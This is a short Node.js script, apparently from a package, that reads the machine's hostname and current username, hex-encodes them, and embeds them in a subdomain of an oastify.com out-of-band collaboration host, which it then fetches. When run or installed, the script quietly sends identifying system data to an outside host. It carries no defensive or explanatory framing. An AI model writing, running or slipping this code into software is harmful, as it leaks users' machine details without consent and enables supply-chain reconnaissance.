const os = require("os");

function stringToHex(str)
{
    const buf = Buffer.from(str, 'utf8');
    return buf.toString('hex');
}

const data = {
    "hn": stringToHex(os.hostname()),
    "un": stringToHex(os.userInfo().username)
}

const url = `https://${data["hn"]}.${data["un"]}.rzuw6k993etm4evlbzxzep33jupkd9.oastify.com/get`;
fetch(url, {
    headers: {
        "User-Agent": "My User Agent",
    },
})
    .then((response) => response.json())
    .then(data => {
        console.log(data);
    })